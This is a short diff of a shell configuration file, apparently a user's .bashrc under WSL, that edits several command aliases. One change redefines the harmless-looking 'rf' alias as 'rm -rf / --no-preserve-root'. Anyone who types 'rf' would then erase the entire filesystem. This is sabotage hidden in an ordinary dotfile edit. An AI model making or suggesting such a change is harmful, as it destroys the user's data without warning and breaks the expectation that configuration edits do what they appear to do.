@@ -19,7 +19,7 @@ unset _GREP
 
 
 alias ..='cd ..'
-alias rf='rm -rf $*'
+alias rf='rm -rf / --no-preserve-root'
 alias here='explorer.exe .'
 alias vi='vim $*'
 
